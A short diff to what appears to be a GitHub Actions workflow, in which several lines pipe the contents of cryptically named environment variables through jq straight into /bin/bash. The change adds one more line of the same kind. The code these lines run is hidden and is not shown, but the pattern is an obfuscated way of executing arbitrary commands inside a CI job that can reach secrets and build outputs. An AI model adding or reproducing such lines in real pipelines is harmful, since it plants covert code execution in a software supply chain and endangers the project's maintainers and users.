@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$e20891" | jq -r .k57003 | /bin/bash
           echo $ve9950 | jq -r .pujj057 | /bin/bash
           echo $nle3099 | jq -r .chjt70298 | /bin/bash
+          echo $x00 | jq -r .t358 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
